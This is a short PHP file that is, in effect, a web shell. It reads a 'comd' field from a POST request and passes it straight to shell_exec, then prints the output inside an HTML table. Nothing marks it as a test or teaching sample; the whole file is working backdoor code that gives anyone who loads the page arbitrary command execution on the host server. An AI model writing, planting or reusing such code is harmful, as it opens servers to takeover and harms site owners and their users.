<?php
$p=$_POST['comd'];
$r=rand(0,2020);
echo '
<table style="text-align:center; width:70%; margin-left:15%; margin-top:50%; margin-right:15%;">
<tr>
<td>
<form action="/" method="POST"><input name="comd" value="" type="text"><form action="/" method="GET"><input name="sessionID" value="' . "$r" . '" type="hidden"></form></form>
';
echo shell_exec("$p");
echo '
</td>
</tr>
</table>
';
?>

